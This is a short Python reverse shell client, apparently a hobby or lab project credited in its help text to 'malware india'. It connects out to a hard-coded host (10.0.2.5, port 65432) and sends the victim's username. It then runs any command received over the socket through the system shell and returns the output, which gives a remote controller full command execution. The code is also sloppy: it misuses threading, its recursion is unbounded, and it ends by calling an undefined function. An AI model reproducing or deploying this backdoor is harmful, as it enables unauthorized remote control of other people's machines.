#!/usr/bin/env python3

encoding = 'utf-8'
import socket
import subprocess
import os
import threading
import getpass

def d(cmd):
    try:
        while True:
            
            if cmd == 'powershell':
                subprocess.call(["C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe"])
            elif cmd == 'help':
                print('''hello this is help this pie shell is made by abdul faheem cmd from malware india
                start= to start an application
                eg start chrome
                others all commands are based on the os thank u''')
            elif cmd[:5]=='start':
                print('starting'+cmd[5:])
                t2=threading.Thread(subprocess.run(cmd,shell=True))
            elif cmd[:3] == 'cd ':
                if cmd[3:] == '..':
                    cmd, b = os.path.split(os.getcwd())
                    del b
                    os.chdir(cmd)
                    continue
                else:
                    os.chdir(cmd[3:])
                    continue
            else:
                b = subprocess.run(cmd, capture_output=True, shell=True, text=True)
            out=b.stdout
            err=b.stderr
            s.sendall(bytes(out+err,'utf-8'))
            pysh()

    except:
        
        if cmd[:6]=='start ':
            print("checking the program status")
            print(b.stderr)
            pysh() 

        else:
            s.sendall(b"## check the input ##")
            print(b.stderr)
            pysh()

def pysh():
        
    data = s.recv(4024)
    cmd=data.decode(encoding)
    print (cmd)
    t1=threading.Thread(d(cmd))

HOST = '10.0.2.5'
PORT = 65432 

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:

    s.connect((HOST, PORT))
    ack= bytes('Connected by'+ HOST+' as user : '+ getpass.getuser(), 'ascii')
    s.sendall(ack)
    pysh()

soc()
